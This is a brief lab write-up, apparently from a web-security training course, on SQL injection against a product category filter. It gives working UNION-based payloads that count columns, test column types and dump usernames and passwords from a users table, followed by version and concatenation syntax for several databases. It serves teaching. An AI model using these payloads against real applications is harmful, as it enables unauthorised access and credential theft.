# Lab 06

## SQLi - Product category filter

**Goal**: Retrieve username and password from users table.

**Analysis**

**Step 1**

- Find the number of columns of the compromised table

- The "ORDER BY" clause could be used to perform this

- The following returns an internal server error if the number passed after the "ORDER BY" clause exceeds the number of columns

> ' ORDER BY 1--

> ' ORDER BY 2--

- The followng will return an Internal Server Error

> ' ORDER BY 3--

**Step 2**

- Find the data type of each column

- The "UNION" clause could be used to perform this

- The following returns an internal server error if the data type passed after the "UNION" caluse does not match the correct data type of the column

- The followoing outputs internal server error

> ' UNION SELECT 'str', NULL--

- The following does not outputs internal server error

> ' UNION SELECT NULL, 'str'--

**Step 4**

- Use the previous information to dump all usernames and passwords from the users table

> ' UNION SELECT NULL, username FROM users--

> ' UNION SELECT NULL, password FRoM users--

**Step 5**

- To output the usernams and passwords at the same time we need to concatenate them togther in one string.

- To do so we need to discover which db system is used, in order to figure out the concatenatino syntax.

- The following is a list of the different way to output the databes used via its version command. 

**Oracle**

> SELECT banner FROM v$version

> SELECT version FROM v$instance

**Microsoft**

> SELECT @@version

**PostgreSQL**

> SELECT version()

**MySQL**

> SELECT @@version

- Once the database is determined, the concatenation syntax can be choosen.

- The following is a the different concatenatino syntax for each database

**Oracle** 	

> 'foo'||'bar'

**Microsoft**

> 'foo'+'bar'

**PostgreSQL** 	

>'foo'||'bar'

**MySQL** 	

>'foo' 'bar' [Note the space between the two strings] CONCAT('foo','bar')

